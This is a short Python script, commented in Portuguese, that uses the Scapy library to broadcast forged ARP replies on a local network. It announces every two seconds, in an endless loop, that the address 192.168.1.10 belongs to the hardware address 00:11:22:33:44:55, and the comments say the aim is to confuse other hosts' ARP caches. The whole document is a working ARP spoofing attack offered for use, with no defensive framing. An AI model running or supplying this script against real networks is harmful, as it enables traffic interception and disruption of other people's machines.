# (injetar anúncio ARP para confundir cache

# Este pacote diz para toda a rede que o IP 192.168.1.10 está no MAC 00:11:22:33:44:55, podendo confundir quem mantém cache ARP.

from scapy.all import *

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="192.168.1.10", hwsrc="00:11:22:33:44:55")
sendp(pkt, loop=1, inter=2)
